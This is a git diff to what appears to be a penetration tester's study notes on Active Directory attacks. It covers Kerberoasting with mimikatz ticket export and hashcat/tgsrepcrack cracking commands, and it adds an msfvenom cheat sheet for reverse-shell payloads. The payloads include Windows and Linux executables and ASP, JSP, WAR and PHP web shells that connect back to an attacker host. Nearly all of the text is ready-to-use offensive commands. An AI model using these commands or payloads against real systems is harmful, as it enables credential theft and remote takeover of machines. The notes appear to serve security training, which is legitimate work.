@@ -272,7 +272,7 @@ mimikatz # misc::cmd
 mimikatz # misc::cmd whoami
 ```
 
-# Kerberoasting
+### Kerberoasting
 <aside>
 Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
 Kerberoasting requires a valid domain account.
@@ -290,7 +290,7 @@ hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
         hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
 ```
 
-# manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
+### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
 
 ```bash
 #get SPN
@@ -306,3 +306,34 @@ mimikatz # kerberos :: list /export
 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
 #crack hash using kirbi2john.py
 python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
+```
+
+# MISC
+
+## MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
+### https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ 
+```bash 
+#Non-Meterpreter Binaries
+
+#Staged Payloads for Windows
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+#Stageless Payloads for Windows
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+
+#Staged Payloads for Linux
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+
+#Stageless Payloads for Linux
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+
+#Non-Meterpreter Web Payloads
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+```
